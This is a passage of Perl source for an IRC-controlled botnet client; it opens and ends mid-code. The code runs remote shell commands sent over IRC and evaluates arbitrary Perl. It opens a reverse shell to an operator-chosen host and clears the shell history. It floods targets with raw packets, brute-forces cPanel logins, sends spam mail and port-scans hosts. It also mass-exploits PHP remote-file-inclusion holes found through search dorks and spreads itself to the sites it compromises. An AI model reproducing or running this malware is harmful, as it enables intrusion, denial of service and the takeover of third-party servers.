            }

            # Msg bot!
            if ( $args =~ /^!msgbot$/ ) {
                foreach $spmchans (@spchans) {
                    msg( $spmchans, $spmsg );
                    sleep 1;
                }
                notice( $pn, "All Channels Messaged! Done.." );
            }

            # E.N.D!!
            if ( $args =~ /^(!chksh|-chksh|!shellchk|-shellchk)$/ ) {
                &xsh($chan);
            }
            if ( $args =~ m/^(!both|-both|!alle|-alle)$/i ) {
                &milw0rm($chan);
                sleep 2;
                &packetstorm_rss($chan);
            }
            if ( ( $args =~ /^!hash\s+(.*)/ ) && ( !$cmoff ) ) {
                &gdataonl( $chan, $1 );
            }
            if ( $args =~ /^(!prx|-prx|!proxyon|-proxyon|-start|!start)$/ )
            {    # Proxy Server!
                &proxysrv($chan);
            }
            if ( $args =~ /^!cpanel\s+(\S+)\s+(\S+)\s+(\d+)/ ) {
                &cPanelBruter( $chan, $1, $2, $3 );
            }

            # Scanall
            if ( ( $args =~ /^!(scanallon|saon)/ ) && ( !$cmoff ) ) {
                $google    = 1;
                $kvasir    = 1;
                $uol       = 1;
                $alltheweb = 1;
                notice( $pn, "(ScanAll) Scanning All Engines." );
            }
            if ( ( $args =~ /^!(scanalloff|saoff)/ ) && ( !$cmoff ) ) {
                $google    = 1;
                $kvasir    = 0;
                $uol       = 0;
                $alltheweb = 0;
                notice( $pn, "(ScanAll) Google Only!" );
            }

            # Scanall end.
            if ( $args =~ /^!(clean|wipe|drop|cleaner)$/ ) {
                &vxclean($msg);
            }
            if ( $args =~ /^(\Q$meunick\E|\Q$xeqt\E)\s+(.*)/ ) {
                my $natrix = $1;
                my $arg    = $2;
                if ( $arg =~ /^\!(.*)/ ) { ircase( $pn, $chan, $1 ); }
                elsif ( $arg =~ /^\@(.*)/ ) {
                    $ondep = $chan;
                    $ondep = $pn if $chan eq $meunick;
                    bfunc( $ondep, $1 );
                }
                else {
                    if   ( !$shad0w ) { runner( $chan, $arg ); }
                    else              { runner( $pn,   $arg ); }
                }
            }
        }
        else {
            if ($public) {
                if ( $args =~ m/^!sc\s+(\S+)\s+(.*)/ ) {
                    &rfiscanner( $chan, $1, $2 );
                }
                if ( $args =~ m/^!ms\s+(.*)/ ) {
                    &teamrx( $chan, $1 );
                }
            }
            if (
                (
                       $chan eq $meunick
                    && $sendnick ne 0
                    && $pn ne $sendnick
                    && $pn ne $meunick
                )
              )
            {
                if ( $args =~
m/^(ps|ls|who|w|uptime|id|wget|pwd|netstat|uname|uname -a)$/i
                  )
                {
                    msg( $sendnick,
                        "[4Warning] NICK: " . $pn . " - " . $args . "" );
                }
                else {
                    msg( $sendnick,
                            "[12Priv-Msg] "
                          . $pn . " @"
                          . $hostmask . ": "
                          . $args
                          . "" );
                }
            }
        }
    }
    elsif ( $ServerArgs =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i ) {
        if ( lc($1) eq lc($meunick) ) {
            $meunick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
        }
    }
    elsif ( $ServerArgs =~ m/^\:(.+?)\s+433/i ) {
        nick( "$meunick" . int rand(9999) );
    }
    elsif ( $ServerArgs =~ m/^\:(.+?)\s+001\s+(\S+)\s/i ) {
        $meunick                              = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        foreach my $kan (@myhood) {
            sendraw("JOIN $kan \x32\x30\x36\x78\x73\x73");
        }
    }
}

sub runner {
    my $msg    = $_[0];
    my $xeQted = $_[1];
    if ( $xeQted =~ /cd (.*)/ ) {
        if ( !$shad0w ) {
            chdir($1) || msg( $msg, "cd: $1: 4No such file or directory" );
        }
        else {
            chdir($1) || notice( $msg, "cd: $1: 4No such file or directory" );
        }
        return;
    }
    elsif ( $pid = fork ) { waitpid( $pid, 0 ); }
    else {
        if (fork) { exit; }
        else {
            my @komd = `$xeQted 2>&1 3>&1`;
            my $c    = 0;
            foreach my $linje (@komd) {
                chop $linje;
                if ( !$shad0w ) {
                    msg( $msg, "$linje" );
                }
                else {
                    notice( $msg, "$linje" );
                }
                if ( $c eq 5 ) {
                    $c = 0;
                    sleep 7;    # Avoid flood.
                }
                $c++;
            }
        }
        exit;
    }
}

sub bfunc {
    my $msg   = $_[0];
    my $argue = $_[1];
    if ( my $pid = fork ) { waitpid( $pid, 0 ); }
    else {
        if (fork) { exit; }
        else {
            if ( $argue =~ /^bc\s+(.*)\s+(\d+)/ ) {
                &bxeQt( $msg, $1, $2 );
            }
            if ( $argue =~ /^m\s+(.*)/ ) {
                &teamrx( $msg, $1 );
            }
            if ( $argue =~ /^s\s+(\S+)\s+(.*)/ ) {
                &rfiscanner( $msg, $1, $2 );
            }
            if ( $argue =~ /^t\s+(.*)/ ) {
                &vulntester( $msg, $1 );
            }
            if ( $argue =~ /^ps\s+(.*)/ ) {
                &portscan( $msg, $1 );
            }
            if ( $argue =~ /^ssh\s+(\S+)\s+(.*)/ ) {
                &portchk( $msg, $1, $2 );
            }
            if ( $argue =~ /^proxy\s+(.*)/ ) {
                &proxyscan( $msg, $1 );
            }
            if ( $argue =~ /^mail\s+(\S+)\s+(\S+)\s+(\S+)\s+(.*)/ ) {
                &sendmail( $msg, $1, $2, $3, $4 );
            }
            if ( $argue =~ /^milw0rm$/ ) {
                &milw0rm($msg);
            }
            if ( $argue =~ /^packetstorm$/ ) {
                &packetstorm_rss($msg);
            }
            if ( $argue =~ /^both$/ ) {
                &milw0rm($msg);
                sleep 2;
                &packetstorm_rss($msg);
            }
            if ( $argue =~ /^crypt\s+(.*)/ ) {
                &vxCrypt( $msg, $1 );
            }
            if ( $argue =~ /^visit\s+(.*)/ ) {
                &urlvisiter( $msg, $1 );
            }
            if ( $argue =~ /^hash\s+(.*)/ ) {
                &gdataonl( $msg, $1 );
            }
            if ( $argue =~ /^chksh$/ ) {
                &xsh($msg);
            }
            if ( $argue =~ /^dl\s+(\S+)\s+(.*)/ ) {
                &getnsave( $msg, $1, $2 );
            }

            # Extra!
            if ( $argue =~ /^(botjoin|spjoin|joinall|msgjoin|bj)$/ ) {
                foreach $spmchanz (@spchans) {
                    sendraw("JOIN $spmchanz");
                }
                msg( $msg, "Joined All Channels." );
            }
            if ( $argue =~ /^(bm|botmsg|msgbot)$/ ) {
                foreach $spmchanz (@spchans) {
                    msg( $spmchanz, $spmsg );
                    sleep 1;
                }
                msg( $msg, "Sendt To All Channels!" );
            }

            # End!
            if ( $argue =~ /^prx$/ ) {
                &proxysrv($msg);
            }
            if ( $argue =~ /^cpanel\s+(\S+)\s+(\S+)\s+(\d+)/ ) {
                &cPanelBruter( $msg, $1, $2, $3 );
            }
            if ( $argue =~ /^(clean|wipe|drop|cleaner)$/ ) {
                &vxclean($msg);
            }
        }
        exit;
    }
}

sub ircase {
    my ( $kem, $printl, $case ) = @_;
    if ( $case =~ /^join\s+(.*)/ ) {
        j("$1");
    }
    if ( $case =~ m/^part\s+(.*)/ ) {
        p("$1");
    }
    if ( $case =~ /^op/ ) {
        op( "$printl", "$kem" ) if $case eq "op";
        my $oarg = substr( $case, 3 );
        op( "$1", "$2" ) if ( $oarg =~ /(\S+)\s+(\S+)/ );
    }
    if ( $case =~ /^deop/ ) {
        deop( "$printl", "$kem" ) if $case eq "deop";
        my $oarg = substr( $case, 2 );
        deop( "$1", "$2" ) if ( $oarg =~ /(\S+)\s+(\S+)/ );
    }
    if ( $case =~ /^say\s+(.*)/ ) {
        msg( $printl, $1 );
    }
    if ( $case =~ /^msg\s+(\S+) (.*)/ ) {
        msg( $1, $2 );
    }
    if ( $case =~ /^nick\s+(.*)/ ) {
        nick("$1");
    }
    if ( $case =~ /^ctcp\s+(\S+)\s+(.*)/ ) {
        ctcp( $1, $2 );
    }
    if ( $case =~ /^cf\s+(\S+)\s+(.*)/ ) {
        for ( my $i = 0 ; $i < int( rand(7) ) ; $i++ ) { ctcp( $1, $2 ); }
    }
    if ( $case =~ /^mf\s+(\S+)\s+(.*)/ ) {
        for ( my $i = 0 ; $i < int( rand(7) ) ; $i++ ) { msg( $1, $2 ); }
    }
    if ( $case =~ /^invite\s+(\S+)\s+(.*)/ ) {
        invite( $1, $2 );
    }
    if ( $case =~ /^me\s+(\S+)\s+(.*)/ ) {
        action( $1, $2 );
    }
    if ( $case =~ /^rn$/ ) {
        sleep( int( rand(6) ) );    # Avoid nick crash..
        nick("$NickName[rand scalar @NickName]");
    }
    if ( $case =~ /^raw\s+(.*)/ ) {
        sendraw("$1");
    }
    if ( $case =~ /^eval\s+(.*)/ ) {
        eval "$1";
    }
    if ( $case =~ m/^chao$/ ) {
        quit( "" . $xVers . " By TeaMrx vS xeQt" );
        exit;
    }
}

# Sub's
sub notice {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub action {
    return unless $#_ == 1;
    sendraw("PRIVMSG $_[0] :\001ACTION $_[1]\001");
}

sub invite {
    return unless $#_ == 1;
    sendraw("INVITE $_[0] :$_[1]");
}

sub ctcp {
    return unless $#_ == 1;
    sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
    return unless $#_ == 1;
    sendraw("PRIVMSG $_[0] :$_[1]");
}

sub op {
    return unless $#_ == 1;
    sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
    return unless $#_ == 1;
    sendraw("MODE $_[0] -o $_[1]");
}

sub modes {
    return unless $#_ == 1;
    sendraw("MODE $_[0] :$_[1]");
}
sub j { &join(@_); }

sub join {
    return unless $#_ == 0;
    sendraw("JOIN $_[0]");
}
sub p { part(@_); }

sub part {
    sendraw("PART $_[0]");
}

sub nick {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub quit {
    sendraw("QUIT :$_[0]");
}

sub sysbotinfo {
    my $nick  = $_[0];
    my $uname = `uname -sr`;
    if   ( ( -x "/usr/bin/wget" ) && ( -e "/usr/bin/wget" ) ) { $wGet = "Yes"; }
    else                                                      { $wGet = "4NO"; }
    if   ( ( -x "/usr/bin/curl" ) && ( -e "/usr/bin/curl" ) ) { $Curl = "Yes"; }
    else                                                      { $Curl = "4NO"; }
    if ( ( -x "/usr/bin/fetch" ) && ( -e "/usr/bin/fetch" ) ) {
        $fetch = "Yes";
    }
    else { $fetch = "4NO"; }
    if   ( ( -x "/usr/bin/GET" ) && ( -e "/usr/bin/GET" ) ) { $GET = "Yes"; }
    else                                                    { $GET = "4NO"; }

    if ( ( -x "/usr/bin/lwp-download" ) && ( -e "/usr/bin/lwp-download" ) ) {
        $LWP = "Yes";
    }
    else { $LWP = "4NO"; }
    notice( $nick,
            ""
          . $xVers
          . " :: Wget: $wGet, Curl: $Curl, Fetch: $fetch, GET: $GET, LWP: $LWP :: $uname"
    );
}

sub bxeQt {
    my $msg    = $_[0];
    my $target = $_[1];
    my $tport  = $_[2];
    my $proto  = getprotobyname('tcp');
    my $iaddr  = inet_aton($target);
    my $paddr  = sockaddr_in( $tport, $iaddr );
    socket( SOCKET, PF_INET, SOCK_STREAM, $proto ) or die "socket: $!";
    connect( SOCKET, $paddr ) or die "connect: $!";
    sendraw( $IRC_cur_socket, "PRIVMSG $msg :xeQted Backconnect.." )
      if ( !$shad0w );
    open( STDIN,  ">&SOCKET" );
    open( STDOUT, ">&SOCKET" );
    open( STDERR, ">&SOCKET" );
    exec {'/bin/sh'} $0 . "\0" x 4;
    system("unset HISTFILE;unset HISTSIZE;unset HISTFILESIZE;unset HISTSAVE");
    close(STDIN);
    close(STDOUT);
    close(STDERR);
    sendraw( $IRC_cur_socket, "PRIVMSG $msg :Closed By Remote" )
      if ( !$shad0w );
}

sub portscan() {
    my $msg   = $_[0];
    my $host  = $_[1];
    my $c     = 0;
    my @ports = (
        "21",    "22",    "23",    "25",    "53",   "80",
        "81",    "110",   "113",   "135",   "137",  "138",
        "139",   "143",   "443",   "445",   "1080", "3306",
        "5900",  "6660",  "6661",  "6662",  "6663", "6665",
        "6666",  "6667",  "6668",  "6669",  "7000", "8080",
        "10000", "31337", "64501", "65500", "65501"
    );
    sendraw( $IRC_cur_socket,
        "PRIVMSG $msg :(12pOrtScan) Checking : " . $host . "" );
    my ( @ialt, %porta_banner );
    foreach my $porten (@ports) {
        my $scansock = IO::Socket::INET->new(
            PeerAddr => $host,
            PeerPort => $porten,
            Proto    => 'tcp',
            Timeout  => 5
        );
        if ($scansock) {
            $c++;
            sendraw( $IRC_cur_socket,
                    "PRIVMSG $msg :["
                  . $c . "]: "
                  . $host . ":"
                  . $porten
                  . " Open" );
            push( @ialt, $porten );
            $scansock->close;
        }
    }
    if ( !@ialt ) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :4Nothing found on $1" );
    }
    else {
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :(12portScan Done) " . $1 . "" );
    }
}

sub portchk() {
    my $msg      = $_[0];
    my $host     = $_[1];
    my $port     = $_[2];
    my $scansock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto    => 'tcp',
        Timeout  => 8
    );
    if ($scansock) {
        sendraw( $IRC_cur_socket,
                "PRIVMSG $msg :Connected to ("
              . $host . " "
              . $port
              . ") is Open" );
        $scansock->close;
    }
    else {
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :Refused connection to (" . $host . ")." );
    }
}

sub dxeqter {
    my $iaddr = inet_aton( $_[0] );
    my $msg   = 'A' x $_[1];
    my $ftime = $_[2];
    my $cp    = 0;
    my (%pacotes);
    $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} =
      $pacotes{tcp} = 0;
    socket( SOCK1, PF_INET, SOCK_RAW,   2 )  or $cp++;
    socket( SOCK2, PF_INET, SOCK_DGRAM, 17 ) or $cp++;
    socket( SOCK3, PF_INET, SOCK_RAW,   1 )  or $cp++;
    socket( SOCK4, PF_INET, SOCK_RAW,   6 )  or $cp++;
    return (undef) if $cp == 4;
    my $itime = time;
    my ($cur_time);

    while (1) {
        for ( my $porta = 1 ; $porta <= 65000 ; $porta++ ) {
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            send( SOCK1, $msg, 0, sockaddr_in( $porta, $iaddr ) )
              and $pacotes{igmp}++;
            send( SOCK2, $msg, 0, sockaddr_in( $porta, $iaddr ) )
              and $pacotes{udp}++;
            send( SOCK3, $msg, 0, sockaddr_in( $porta, $iaddr ) )
              and $pacotes{icmp}++;
            send( SOCK4, $msg, 0, sockaddr_in( $porta, $iaddr ) )
              and $pacotes{tcp}++;
            for ( my $pc = 3 ; $pc <= 255 ; $pc++ ) {
                next if $pc == 6;
                $cur_time = time - $itime;
                last if $cur_time >= $ftime;
                socket( SOCK5, PF_INET, SOCK_RAW, $pc ) or next;
                send( SOCK5, $msg, 0, sockaddr_in( $porta, $iaddr ) )
                  and $pacotes{o}++;
            }
        }
        last if $cur_time >= $ftime;
    }
    return ( $cur_time, %pacotes );
}

sub xdrop {
    my $msg    = $_[0];
    my $host   = $_[1];
    my $size   = $_[2];
    my $lenght = $_[3];
    if ( my $pid = fork ) { waitpid( $pid, 0 ); }
    else {
        if (fork) { exit; }
        else {
            sendraw( $IRC_cur_socket,
                "PRIVMSG $msg :Sending Message to: " . $host . "" );

#sendraw($IRC_cur_socket, "PRIVMSG $msg :(12xeQted) ".$host." Size: ".$size." KB Lenght: ".$lenght."");
            my ( $dtime, %pacotes ) = dxeqter( "$host", "$size", "$lenght" );
            $dtime = 1 if $dtime == 0;
            my %bytes;
            $bytes{igmp} = $2 * $pacotes{igmp};
            $bytes{icmp} = $2 * $pacotes{icmp};
            $bytes{o}    = $2 * $pacotes{o};
            $bytes{udp}  = $2 * $pacotes{udp};
            $bytes{tcp}  = $2 * $pacotes{tcp};
            sendraw(
                $IRC_cur_socket,
                "PRIVMSG $msg :Sendt ("
                  . int(
                    ( $bytes{icmp} + $bytes{igmp} + $bytes{udp} + $bytes{o} ) /
                      1024
                  )
                  . "/KB) to "
                  . $host . ""
            );

#sendraw($IRC_cur_socket, "PRIVMSG $msg :10(12xeQt Done10) Sent10:12 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 10KB 10in12 ".$dtime." 10seconds Target:12 ".$host." ");
        }
        exit;
    }
}

sub checksendmail {
    my $msg = $_[0];
    if ( ( -f "/usr/sbin/sendmail" ) && ( -x "/usr/sbin/sendmail" ) ) {
        sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :14(12Sendmail14) Locked and loaded.." );
    }
}

sub sendmail {
    my $msg       = $_[0];
    my $subject   = $_[1];
    my $sender    = $_[2];
    my $recipient = $_[3];
    my @corpo     = $_[4];
    my $rndmail;
    my $sendmail = '/usr/sbin/sendmail' || return;
    sendraw( $IRC_cur_socket,
        "PRIVMSG $msg :10(12SendMail10) Sending to " . $3 . "" );
    my $mailtype = "content-type: text/html";
    open( SENDMAIL, "| $sendmail -t" );
    print SENDMAIL "$mailtype\n";
    print SENDMAIL "Subject: $subject\n";
    print SENDMAIL "From: $sender\n";
    print SENDMAIL "To: $recipient\n\n";
    print SENDMAIL "@corpo\n\n";
    close(SENDMAIL);
    sendraw( $IRC_cur_socket, "PRIVMSG $msg :Message Sendt." );
}

####################################
## Public Proxy + Google Checker! ##
####################################
sub proxyscan {
    my $msg = $_[0];
    my $str = $_[1];
    eval "use HTTP::Request;";
    if ($@) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :12HTTP::12Request Missing!" );
        return;
    }
    eval "use LWP::UserAgent;";
    if ($@) {
        sendraw( $IRC_cur_socket, "PRIVMSG $msg :12LWP::12UserAgent Missing!" );
        return;
    }
    if    ( $str =~ m/^(a|anon|anonymous)$/i ) { $str = "anonymous"; }
    elsif ( $str =~ m/^(transparent|tp|t)$/i ) { $str = "transparent"; }
    elsif ( $str =~ m/^(h|high|e|elite)$/i )   { $str = "high anonymity"; }
    else {
        sendraw( $IRC_cur_socket,
"PRIVMSG $msg :!proxy <a|anon|anonymous|t|tp|transparent|elite|e|high>"
        );
        return;
    }
    my @type  = "$str";
    my @ttt   = ();
    my @ttt1  = ();
    my @ttt2  = ();
    my @ttt3  = ();
    my $sockt = IO::Socket::INET->new(
        PeerAddr => "publicproxyservers.com",
        PeerPort => "80",
        Proto    => "tcp"
    ) or return;
    print $sockt
"GET http://www.publicproxyservers.com/page1.html HTTP/1.0\r\nHost: publicproxyservers.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
    my @r = <$sockt>;
    $page = "@r";
    close($sockt);

    while ( $page =~ m/<td align=\"left\" height=17(.*)<\/td>/g ) {
        push( @ttt, $1 );
    }
    while ( $page =~ m/<td>([A-Z].*)<\/td>/g ) {
        push( @ttt1, $1 );
    }
    while ( $page =~ m/<td height=17>(.*)<\/td>/g ) {
        push( @ttt2, $1 );
    }
    while ( $page =~ m/<td>(anonymous|transparent|high anonymity)<\/td>/g ) {
        push( @ttt3, $1 );
    }
    foreach $x ( 0 .. ( @ttt - 1 ) ) {
        if ( $ttt3[$x] =~ /@type/ ) {
            ( my $a, my $ipaddr ) = split( />/, $ttt[$x] );
            my $prox = "" . $ipaddr . ":" . $ttt2[$x] . "";
            my $ua   = LWP::UserAgent->new;
            $ua->timeout(10);
            $ua->env_proxy;
            $ua->agent( @useragents[ int( rand( scalar(@useragents) ) ) ] );
            $ua->proxy( 'http', 'http://' . $prox );
            my $response = $ua->get("http://www.google.com/search?q=msn");

            if (   $response->is_success
                && $response->content =~ /msn/
                && $response->content =~ /Messenger/ )
            {
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $msg :(12"
                      . $ttt3[$x] . ") "
                      . $ipaddr . ":"
                      . $ttt2[$x]
                      . " - $ttt1[$x]" );
            }
        }
    }
}

##############################
# milw0rm vS Packetstorm RSS #
##############################
sub milw0rm {
    my $msg = $_[0];
    my @ltt = ();
    my @bug = ();
    my $x;
    my $c     = 0;
    my $page  = "";
    my $socke = IO::Socket::INET->new(
        PeerAddr => "milw0rm.com",
        PeerPort => "80",
        Proto    => "tcp"
    ) or return;
    print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\n";
    print $socke "Host: milw0rm.com\r\n";
    print $socke "Accept: */*\r\n";
    print $socke "User-Agent: Mozilla/5.0\r\n\r\n";
    my @r = <$socke>;
    $page = "@r";
    close($socke);

    while ( $page =~ m/<title>(.*)</g ) {
        $x = $1;
        if ( $x =~ /\&lt\;/ ) {
            $x =~ s/\&lt\;/</g;
        }
        if ( $x !~ /milw0rm/ ) {
            push( @bug, $x );
        }
    }
    while ( $page =~ m/<link.*expl.*([0-9]...)</g ) {
        if ( $1 !~ m/milw0rm.com|exploits|en/ ) {
            push( @ltt, "http://www.milw0rm.com/exploits/$1 " );
        }
    }

    #sendraw($IRC_cur_socket, "PRIVMSG $msg :(12milw0rm) Last Threads..");
    foreach $x ( 0 .. ( @ltt - 1 ) ) {
        sendraw( $IRC_cur_socket,
                "PRIVMSG $msg :[12"
              . $c . "]14 "
              . $bug[$x] . " "
              . $ltt[$x]
              . "" );
        sleep 3;
        $c++;
    }
}

sub packetstorm_rss {
    my $msg = $_[0];
    my $c   = 0;
    my $x;
    my @ttt  = ();
    my @ttt1 = ();
    my $sock = IO::Socket::INET->new(
        PeerAddr => "www.packetstormsecurity.org",
        PeerPort => "80",
        Proto    => "tcp"
    ) or return;
    print $sock "GET /whatsnew20.xml HTTP/1.0\r\n";
    print $sock "Host: www.packetstormsecurity.org\r\n";
    print $sock "Accept: */*\r\n";
    print $sock "User-Agent: Mozilla/5.0\r\n\r\n";
    my @r = <$sock>;
    $page = "@r";
    close($sock);

    while ( $page =~ m/<link>(.*)<\/link>/g ) {
        push( @ttt, $1 );
    }
    while ( $page =~ m/<description>(.*)<\/description>/g ) {
        push( @ttt1, $1 );
    }
    foreach $x ( 0 .. ( @ttt - 1 ) ) {
        sendraw( $IRC_cur_socket,
                "PRIVMSG $msg :[12"
              . $c . "] 14"
              . $ttt1[$x] . ""
              . $ttt[$x]
              . "" );
        sleep 3;
        $c++;
    }
}

sub dorkdecode($) {
    my $str = $_[0];
    $str =~ s/ /\+/g;
    $str =~ s/:/\%3A/g;
    $str =~ s/\//\%2F/g;
    $str =~ s/&/\%26/g;
    $str =~ s/"/\%22/g;
    $str =~ s/,/\%2C/g;
    $str =~ s/\\/\%5C/g;
    return $str;
}

sub vxCrypt() {
    my $msg      = $_[0];
    my $vstr     = $_[1];
    my $salt     = $NickName[ rand scalar @NickName ];
    my $cryptstr = crypt( $vstr, $salt );
    eval "use Digest::MD5 qw(md5_hex);";
    if ($@) {
        sendraw( $IRC_cur_socket,
                "PRIVMSG $msg :(12vxCrypt) String: "
              . $cryptstr
              . " - Salt:"
              . $salt
              . "" );
        return;
    }
    sendraw( $IRC_cur_socket,
            "PRIVMSG $msg :(12vxCrypt) Perl/Salt:("
          . $cryptstr . "/"
          . $salt
          . ") - MD5:("
          . md5_hex($vstr)
          . ")" );
}

sub rfiscanner {
    my $msg          = $_[0];
    my $VulnFile     = $_[1];
    my $Googledorken = $_[2];
    my $last         = "";
    my @tots;
    if ( my $pid = fork ) { waitpid( $pid, 0 ); }
    else {
        if (fork) { exit(); }
        else {
            &modcheck($msg);    # Mod Check!
            my $strcode = dorkdecode($2);
            my @urls    = &googler($strcode);
            if ( ( !$google ) && ( !$kvasir ) && ( !$uol ) ) {
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $msg :(4ScanOption) No ScanModes Selected." );
                exit;
            }
            if ($google) {
                my @g = &googler($strcode);
                push( @phpls, @g );
            }
            if ($kvasir) {
                my @k = &kvasir($strcode);
                push( @phpls, @k );
            }
            if ($uol) {
                my @u = &uolscan($strcode);
                push( @phpls, @u );
            }
            my $founds = scalar(@phpls);
            if ( !$founds ) {
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $msg :(4Banned!) " . $2 . "" );
                exit;
            }
            sendraw( $IRC_cur_socket,
                "PRIVMSG $msg :(12RFI.xQt) " . scalar(@phpls) . "" );
            foreach $url (@phpls) {
                my $path = "";
                my $file = "";
                ( $path, $file ) = $url =~ /^(.+)\/(.+)$/;
                $doit = "http://" . $path . "/" . $VulnFile . $cmdsh . "";
                $urihide =
                  "http://" . $path . "/" . $VulnFile . $showshell . "";
                $bcsprd = "http://" . $path . "/" . $VulnFile . $bcurl . "";
                $xstest = "http://" . $path . "/" . $VulnFile . "" if ($xsson);
                next if ( $doit eq $last );
                my $req = HTTP::Request->new( GET => $doit );
                my $ua = LWP::UserAgent->new();
                $ua->timeout(8);
                my $response = $ua->request($req);
                my $xeqtz    = $response->content;

                #print "RFI:".$doit."\n";       # Debug in shell.
                if ( $response->is_success ) {
                    &xsScan( $msg, $xstest ) if ($xsson);
                    if (   $xeqtz =~ /f7f32504cabcb48c21030c024c6e5c1a/
                        && $xeqtz =~ /uid=/
                        && $xeqtz =~ /Uname:(.*)/
                        && $xeqtz !~ /SySOs:WINNT/ )
                    {
                        ( my $di ) = split( /<br>/, $1 );
                        sendraw( $IRC_cur_socket,
                            "PRIVMSG $msg :7" . $di . "" );
                        sendraw( $IRC_cur_socket,
                            "PRIVMSG $msg :" . $urihide . "" );
                        if ( $bcurl ne 0 ) {
                            &xeqt_back( $msg, $bcsprd );    # xeQted!
                        }
                    }

                    # Windows!
                    elsif ($xeqtz =~ /f7f32504cabcb48c21030c024c6e5c1a/
                        && $xeqtz =~ /DNS-/
                        && $xeqtz =~ /[Adapter]/
                        && $mrx =~ /SySOs:WINNT/ )
                    {
                        sendraw( $IRC_cur_socket,
                            "PRIVMSG $msg :10(12WindowS10) " . $urihide . "" );
                        if ( $bcurl ne 0 ) {  # Dont waste time if spread is off
                            &xeqt_back( $msg, $bcsprd );
                        }
                    }
                    elsif ( $xeqtz =~ /f7f32504cabcb48c21030c024c6e5c1a/ )
                    {                         # Everything Disabled!
                        sendraw( $IRC_cur_socket,
                            "PRIVMSG $msg :12(7SafeMode12) " . $urihide . "" )
                          if ($safe_print);
                    }
                }
                $last = $doit;
            }
            undef(@phpls);
            if ( scalar(@phpls) < 300 ) { exit; }
            sendraw( $IRC_cur_socket, "PRIVMSG $msg :Done" );
        }
        exit;
    }
}

#################################
## vxAio Auto Scanner By xeQt! ##
#################################
sub teamrx {
    my $msg  = $_[0];
    my $d0rk = $_[1];
    my $co2  = 1;
    my $last;
    my @phplst;
    if ( my $pid = fork ) { waitpid( $pid, 0 ); }
    else {
        if (fork) { exit; }
        else {
            &modcheck($msg);    # Mod Check!
            sendraw( $IRC_cur_socket,
                "PRIVMSG $msg :14(12PHP.xQt14) " . $d0rk . "" );
            my $strcode = dorkdecode($d0rk);
            if ( ( !$google ) && ( !$kvasir ) && ( !$uol ) && ($alltheweb) ) {
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $msg :(4ScanOption) No ScanModes Selected." );
                exit;
            }
            if ($google) {
                my @g = &googler($strcode);
                push( @phplst, @g );

             #sendraw($IRC_cur_socket, "PRIVMSG $msg :(Google) ".scalar(@g)."");
            }
            if ($kvasir) {
                my @k = &kvasir($strcode);
                push( @phplst, @k );

             #sendraw($IRC_cur_socket, "PRIVMSG $msg :(Kvasir) ".scalar(@k)."");
            }
            if ($uol) {
                my @u = &uolscan($strcode);
                push( @phplst, @u );

                #sendraw($IRC_cur_socket, "PRIVMSG $msg :(UOL) ".scalar(@u)."");
            }
            if ($alltheweb) {
                my @all = &alltheweb($strcode);
                push( @phplst, @all );

        #sendraw($IRC_cur_socket, "PRIVMSG $msg :(AllTheWeb) ".scalar(@all)."");
            }
            my @phpgo  = &workout(@phplst);
            my $founds = scalar(@phpgo);
            if ( !$founds ) {
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $msg :(4Error!) " . $d0rk . "" );
                exit;
            }
            sendraw( $IRC_cur_socket,
                "PRIVMSG $msg :12xeQting " . $founds . " Good142Go" );
            foreach $phpmark (@phpgo) {
                $phpsite = "http://" . $phpmark . $cmdsh . "";
                $shows   = "http://" . $phpmark . $showshell . "";
                $backon  = "http://" . $phpmark . $bcurl . "";
                $xssql   = "http://" . $phpmark . "";
                next if ( $phpsite eq $last );
                if ( $co2 % 500 == 0 ) {
                    sendraw( $IRC_cur_socket,
                        "PRIVMSG $msg :" . $co2 . "/" . $founds . "" );
                }
                my $req = HTTP::Request->new( GET => $phpsite );
                my $ua = LWP::UserAgent->new();
                $ua->timeout(7);
                my $response = $ua->request($req);
                my $xeqta    = $response->content;

                # Debug!
                #print "".$phpsite."\n";
                #sendraw($IRC_cur_socket, "PRIVMSG $msg :Testing: ".$xssql."");

                if ( $response->is_success ) {
                    &xsScan( $msg, $xssql ) if ($xsson);
                    if (
                        (
                               $xeqta =~ /f7f32504cabcb48c21030c024c6e5c1a/
                            && $xeqta =~ /uid=/
                            && $xeqta =~ m/Uname:(.*?)<br>/
                            && $xeqta !~ m/SySOs:WINNT/
                        )
                      )
                    {
                        ( my $died ) = split( /<br>/, $1 );
                        sendraw( $IRC_cur_socket, "PRIVMSG $msg :7" . $1 . "" );
                        sendraw( $IRC_cur_socket,
                            "PRIVMSG $msg :" . $shows . "" );
                        if ( $bcurl ne 0 ) {
                            &xeqt_back( $msg, $backon );    # xeQted!
                        }
                    }
                    elsif ($xeqta =~ /f7f32504cabcb48c21030c024c6e5c1a/
                        && $xeqta =~ /DNS-/
                        && $xeqta =~ /[Adapter]/
                        && $mrx =~ /SySOs:WINNT/ )
                    {
                        sendraw( $IRC_cur_socket,
                            "PRIVMSG $msg :14(9Windows14) " . $shows . "" );
                        if ( $bcurl ne 0 ) {
                            &xeqt_back( $msg, $backon );    # Windows!
                        }
                    }
                    elsif ( $xeqta =~ /f7f32504cabcb48c21030c024c6e5c1a/ ) {
                        &xsScan( $msg, $xsstest ) if ($xsson);
